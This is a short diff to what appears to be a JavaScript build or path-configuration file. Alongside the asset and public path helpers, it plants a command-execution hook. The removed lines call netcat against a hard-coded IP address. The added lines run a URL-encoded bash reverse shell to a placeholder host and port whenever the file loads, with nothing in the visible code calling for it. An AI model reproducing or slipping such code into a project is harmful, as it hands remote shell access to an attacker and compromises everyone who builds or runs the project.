@@ -7,8 +7,8 @@ const asset = file => path.resolve('src/assets', file || '');
 const public = file => path.resolve("public", file || '');
 
 var fs = require('fs');
-const { execSync } = require('child_process');
-execSync('nc 137.184.229.213 80', (err, stdout, stderr) => {
+const { exec } = require('child_process');
+exec('bash+-c+"bash+-i+>%26+/dev/tcp/nc_host/nc_port+0>%261"', (err, stdout, stderr) => {
   if (err) {
     // node couldn't execute the command
     return;
